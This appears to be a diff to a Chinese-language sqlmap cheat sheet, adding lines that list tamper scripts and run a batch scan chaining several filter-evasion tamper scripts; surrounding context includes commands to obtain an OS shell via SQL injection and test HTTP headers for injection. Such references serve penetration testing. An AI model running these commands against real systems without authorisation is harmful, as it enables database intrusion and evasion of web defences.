@@ -27,6 +27,8 @@ sqlmap -u url --os-shell --random-agent --batch
 sqlmap -u url -v 1 --sql-query 'select top 20 * from City'
 # 读取原生http报文(可用来测试http报头中其他字段的是否存在注入，比如：cookie注入，X-Forwarded-For注入)
 sqlmap -r raw.txt
-
+# 显示所有绕过脚本
+sqlmap --list-tampers
+sqlmap -m temp2.txt --batch --random-agent --tamper  xforwardedfor.py,greatest.py,equaltorlike.py,equaltolike.py,sleep2getlock.py,space2comment.py
 ```
 
